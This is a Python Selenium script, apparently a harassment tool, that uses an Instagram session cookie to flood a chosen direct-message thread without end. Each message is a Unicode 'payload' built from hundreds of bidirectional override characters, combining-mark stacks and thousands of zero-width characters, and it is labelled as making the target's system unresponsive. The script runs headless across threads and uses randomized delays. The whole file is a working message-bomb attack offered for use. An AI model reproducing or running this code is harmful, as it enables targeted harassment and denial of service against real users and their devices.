# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER PAPA - 10 AGENT MATRIX
# 📅 STATUS: 200 OVERRIDES | 80-MARK ZALGO | MAX IMPACT

import os, time, random, threading, sys, gc, tempfile, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- CONFIG ---
THREADS = 2
SESSION_LIMIT = 180 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_matrix_payload(target_name):
    """The Matrix Payload: 200 Overrides + 80-mark Zalgo Skyscraper."""
    header = f"👑 PRAVEER PAPA 👑 SYSTEM ERROR: {target_name.upper()} HAS BEEN OWNED\n"
    
    # 💥 THE 'RECURSION TRAP' (200 Directional Overrides)
    direction_chaos = ("\u202E" + "\u202D") * 200 
    
    # 💥 THE 'ZALGO TOWER' (80-mark density)
    z_tower = "̸" * 80
    
    # 💥 THE 'BLOAT' (5,500 invisible characters)
    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(5500))
    
    lines = [header, bloat]
    
    # 💥 60 Lines of Skyscraper
    for _ in range(60):
        lines.append(direction_chaos + f"{target_name.upper()}_OWNED" + z_tower)
    
    lines.append(bloat + "\n🛑 SYSTEM UNRESPONSIVE 🛑")
    return "\n".join(lines)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        session_start = time.time()
        try:
            driver = webdriver.Chrome(options=chrome_options)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(10)

            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    payload = get_matrix_payload(target_name)
                    driver.execute_script("""
                        var el = arguments[0];
                        document.execCommand('insertText', false, arguments[1]);
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                    """, box, payload)
                    box.send_keys(Keys.ENTER)
                    print(f"[M{MACHINE_ID}-A{agent_id}] IMPACT SENT")
                    time.sleep(random.uniform(0.8, 1.5))
                except:
                    time.sleep(3)
                    break
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(2)

# Global Chrome Options
chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument("--window-size=1920,1080")
chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
